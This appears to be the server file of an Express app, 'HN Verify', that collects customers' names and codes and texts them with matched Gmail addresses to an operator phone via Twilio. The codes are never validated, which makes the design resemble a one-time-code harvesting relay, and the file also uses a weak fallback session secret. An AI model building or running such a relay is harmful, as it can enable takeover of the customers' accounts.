require('dotenv').config();
const express = require('express');
const session = require('express-session');
const rateLimit = require('express-rate-limit');
const twilio = require('twilio');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

// Load customer data
const customers = JSON.parse(fs.readFileSync(path.join(__dirname, 'customers_data.json'), 'utf8'));

// Enrollment requests log (in-memory; persisted to file)
const ENROLL_FILE = path.join(__dirname, 'enrollment_requests.json');
const VERIFY_LOG_FILE = path.join(__dirname, 'verification_log.json');

function loadJSON(file) {
  if (fs.existsSync(file)) {
    try { return JSON.parse(fs.readFileSync(file, 'utf8')); } catch { return []; }
  }
  return [];
}

function saveJSON(file, data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));
app.use(session({
  secret: process.env.SESSION_SECRET || 'fallback-secret-change-me',
  resave: false,
  saveUninitialized: false,
  cookie: { maxAge: 8 * 60 * 60 * 1000 } // 8 hours
}));

// Auth middleware
function requireAuth(req, res, next) {
  if (req.session && req.session.authenticated) return next();
  res.redirect('/login');
}

// Rate limit login attempts (5 per 15 min per IP)
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  message: { success: false, error: 'Too many attempts. Try again in 15 minutes.' },
  standardHeaders: true,
  legacyHeaders: false
});

// ─── PUBLIC ROUTES ─────────────────────────────────────────────────────────

// Customer verification page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Customer submits name + code
app.post('/api/verify', (req, res) => {
  const { name, code } = req.body;

  if (!name || !code) {
    return res.json({ success: false, error: 'missing_fields' });
  }

  const nameTrimmed = name.trim().toLowerCase();
  const customer = customers.find(c => c.name.toLowerCase() === nameTrimmed);

  const log = loadJSON(VERIFY_LOG_FILE);
  const entry = {
    id: Date.now(),
    timestamp: new Date().toISOString(),
    submittedName: name.trim(),
    code: code.trim(),
    found: !!customer,
    tag: customer ? customer.tag : null,
    gmail: customer ? customer.gmail : null
  };
  log.unshift(entry);
  if (log.length > 200) log.splice(200);
  saveJSON(VERIFY_LOG_FILE, log);

  if (!customer) {
    return res.json({ success: false, error: 'not_found' });
  }

  // Send SMS via Twilio
  const twilioClient = twilio(process.env.TWILIO_ACCOUNT_SID, process.env.TWILIO_AUTH_TOKEN);
  const smsBody = `📋 HN Verify\nCustomer: ${customer.name}\nAccount: ${customer.tag}\nGmail: ${customer.gmail}\nCode: ${code.trim()}`;

  twilioClient.messages.create({
    body: smsBody,
    from: process.env.TWILIO_FROM_NUMBER,
    to: process.env.TWILIO_TO_NUMBER
  }).then(() => {
    res.json({ success: true, customerName: customer.name });
  }).catch(err => {
    console.error('Twilio error:', err.message);
    // Still respond success to customer — SMS failure is internal
    res.json({ success: true, customerName: customer.name, smsWarning: true });
  });
});

// Customer enrollment request
app.post('/api/enroll', (req, res) => {
  const { name, phone, address } = req.body;
  if (!name) return res.json({ success: false, error: 'missing_fields' });

  const enrollments = loadJSON(ENROLL_FILE);
  enrollments.unshift({
    id: Date.now(),
    timestamp: new Date().toISOString(),
    name: name.trim(),
    phone: (phone || '').trim(),
    address: (address || '').trim(),
    status: 'pending'
  });
  saveJSON(ENROLL_FILE, enrollments);

  // Notify via SMS
  const twilioClient = twilio(process.env.TWILIO_ACCOUNT_SID, process.env.TWILIO_AUTH_TOKEN);
  const smsBody = `📝 New Enrollment Request\nName: ${name.trim()}\nPhone: ${phone || 'N/A'}\nAddress: ${address || 'N/A'}`;

  twilioClient.messages.create({
    body: smsBody,
    from: process.env.TWILIO_FROM_NUMBER,
    to: process.env.TWILIO_TO_NUMBER
  }).catch(err => console.error('Twilio enroll SMS error:', err.message));

  res.json({ success: true });
});

// ─── AUTH ROUTES ───────────────────────────────────────────────────────────

app.get('/login', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

app.post('/api/login', loginLimiter, (req, res) => {
  const { password, backupCode } = req.body;
  const backupRequired = !!process.env.DASHBOARD_BACKUP_CODE;

  const passwordOk = password === process.env.DASHBOARD_PASSWORD;
  const backupOk = !backupRequired || backupCode === process.env.DASHBOARD_BACKUP_CODE;

  if (passwordOk && backupOk) {
    req.session.authenticated = true;
    res.json({ success: true });
  } else {
    res.json({ success: false, error: 'Invalid password' + (backupRequired ? ' or backup code' : '') });
  }
});

app.post('/api/logout', (req, res) => {
  req.session.destroy();
  res.json({ success: true });
});

// ─── DASHBOARD ROUTES ──────────────────────────────────────────────────────

app.get('/dashboard', requireAuth, (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

// Dashboard data APIs
app.get('/api/customers', requireAuth, (req, res) => {
  const { search, tag } = req.query;
  let results = customers;
  if (search) {
    const s = search.toLowerCase();
    results = results.filter(c => c.name.toLowerCase().includes(s));
  }
  if (tag) {
    results = results.filter(c => c.tag === tag);
  }
  res.json(results);
});

app.get('/api/tags', requireAuth, (req, res) => {
  const tags = [...new Set(customers.map(c => c.tag))].sort();
  res.json(tags);
});

app.get('/api/verify-log', requireAuth, (req, res) => {
  res.json(loadJSON(VERIFY_LOG_FILE));
});

app.get('/api/enrollments', requireAuth, (req, res) => {
  res.json(loadJSON(ENROLL_FILE));
});

app.patch('/api/enrollments/:id', requireAuth, (req, res) => {
  const id = parseInt(req.params.id);
  const { status } = req.body;
  const enrollments = loadJSON(ENROLL_FILE);
  const idx = enrollments.findIndex(e => e.id === id);
  if (idx === -1) return res.json({ success: false });
  enrollments[idx].status = status;
  saveJSON(ENROLL_FILE, enrollments);
  res.json({ success: true });
});

// Add customer manually
app.post('/api/customers', requireAuth, (req, res) => {
  const { name, tag, gmail } = req.body;
  if (!name || !tag) return res.json({ success: false, error: 'missing_fields' });
  customers.push({ name: name.trim(), tag: tag.trim(), gmail: (gmail || '').trim() });
  saveJSON(path.join(__dirname, 'customers_data.json'), customers);
  res.json({ success: true });
});

app.listen(PORT, () => {
  console.log(`✅ HN Verify app running at http://localhost:${PORT}`);
  console.log(`   Public page:  http://localhost:${PORT}/`);
  console.log(`   Dashboard:    http://localhost:${PORT}/dashboard`);
});
